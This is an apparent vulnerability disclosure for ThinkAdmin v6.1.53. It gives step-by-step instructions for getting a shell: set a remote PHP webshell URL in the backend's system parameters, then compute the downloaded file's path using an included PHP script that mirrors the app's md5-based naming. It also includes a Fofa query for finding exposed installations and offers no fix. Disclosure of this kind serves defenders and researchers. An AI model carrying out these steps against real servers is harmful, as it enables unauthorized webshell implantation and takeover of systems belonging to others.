ThinkAdmin Logical defect getshell



Project Introduction

ThinkAdmin is a product that follows [MIT]（ https://mit-license.org/ ）Protocol open source rapid development framework, based on the latest version of  ThinkPHP6 , a minimalist backend management system (compatible with ThinkPHP8)

Official website: https://thinkadmin.top/



Audit version: ThinkAdmin Version v6.1.53

![image](https://github.com/1dreamGN/CVE/assets/112082417/51ff63b5-e982-40fb-bd28-5d11fe91e5ac)


 

Fofa : body="/admin/api.plugs/script"

![image](https://github.com/1dreamGN/CVE/assets/112082417/b69077fd-69ff-424f-af4e-639c6fe6f117)


Logical defect getshell
Recurrence of vulnerabilities
Log in to the backend to set system parameters

![image](https://github.com/1dreamGN/CVE/assets/112082417/ffbe221d-62d6-40e7-9a5b-996c8af3df44)


Fill in the URL of a pure static downloadable PHP webshell file here
That is, the webshell download path
Click to save the configuration
After saving, calculate the path to download to the server
The script is as follows

```
function name(string $url, string $ext = '', string $pre = '', string $fun = 'md5'): string

{

  [$hah, $ext] = [$fun($url), trim($ext ?: pathinfo($url, 4), '.\\/')];

  $attr = [trim($pre, '.\\/'), substr($hah, 0, 2), substr($hah, 2, 30)];

  return trim(join('/', $attr), '/') . '.' . strtolower($ext ?: 'tmp');

}

 

$url = "webshell path";

 

echo '/upload/'.name($url, '', 'down/');
```



 

![image](https://github.com/1dreamGN/CVE/assets/112082417/20b4395a-7e1f-43a6-adb0-df7c3b7e6c69)


Use the above calculation to calculate the URL variable as the URL for setting system parameters
Splicing paths is sufficient

![image](https://github.com/1dreamGN/CVE/assets/112082417/77ebfffa-fa50-40df-9a50-1c3522b28a53)
